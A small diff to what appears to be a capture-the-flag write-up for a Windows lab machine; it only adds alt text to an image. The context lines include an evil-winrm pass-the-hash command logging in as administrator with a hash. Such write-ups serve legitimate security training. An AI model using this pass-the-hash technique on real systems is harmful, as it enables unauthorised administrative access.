@@ -169,7 +169,7 @@ With the administrator's hash we can connect and get the system flag.
 
 - `evil-winrm -i 10.10.220.192 -u administrator -H "c2597747aa5e43022a3a3049a3c3b09d"`
 
-![](/assets/vulnnet-roasted01.png)
+![0xskar](/assets/vulnnet-roasted01.png)
 
 * * * 
 
